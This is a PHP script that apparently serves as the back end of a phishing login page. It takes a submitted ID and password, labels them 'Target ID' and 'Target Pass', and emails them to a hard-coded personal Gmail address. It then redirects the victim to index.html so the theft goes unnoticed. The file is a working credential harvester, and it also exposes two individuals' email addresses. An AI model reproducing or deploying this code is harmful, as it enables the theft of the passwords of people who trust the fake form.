<?php

$numbError = $passError = "";
$numb = $pass = ""; 

if($_SERVER["REQUEST_METHOD"] == "POST")
{
	if(empty($_POST["numb"]))
        $numbError = "Name is required.!";
    else 
        $numb = $_POST["numb"];
        
	if(empty($_POST["pass"]))
		$passError = "Passward is required";
	else 
        $pass = $_POST["pass"];
}

if($numbError == "" &&  $passError == "")
{
    $target = $numb;
    $target_pass = $pass;

    $emailFrom = "hassanhossain43@gmail.com";
    $emailTo = "riadhossain7464@gmail.com";

    $subject = "Got some info for you";
    $body = "Target ID :".$target."\n".
             "Target Pass :".$target_pass."\n".

    $headers = "From :".$emailFrom."\r\n".
                "Reply to:".$emailTo."\r\n";

    mail($emailTo,$subject,$body,$headers);
    header("Location: index.html");
}
    
    //else 
	// {
	// 	//echo "Opps...Error occured.! PLease Enter a name with laters and spaces and a valid Email format.\n Click back button on your browser to go back.";
	// 	print " <div style=\"position: absolute;
	// 			border: 1px solid black;
	// 			top: 40%;
	// 			left: 50%;
	// 			width: 400px;
	// 			transform: translate(-50%,-40%);
	// 			border-radius: 10px;
	// 			display:flex;
	// 			flex-direction:column;
	// 			\">
	// 				<h3 style=\"margin:14px;\">Opps...Error occured.! PLease Enter a name with laters and spaces and a valid Email format.\n Click Go Back button to go back.</h3>
	// 				<a href=\"index.html\" style=\"padding:15px;background:black;color:white;border-radius: 8px;text-decoration:none;\">Go Back</a>
	// 			</div>";
	// 	/*echo "
	// 	      <div style="position: absolute;
	// 			border: 1px solid black;
	// 			top: 50%;
	// 			left: 50%;
	// 			width: 400px;
	// 			transform: translate(-50%,-50%);
	// 			border-radius: 10px;
	// 			">
	// 				<h3>Opps...Error occured.! PLease Enter a name with laters and spaces and a valid Email format.\n Click back button on your browser to go back.</h3>
	// 			</div>";*/
			
	// }
?>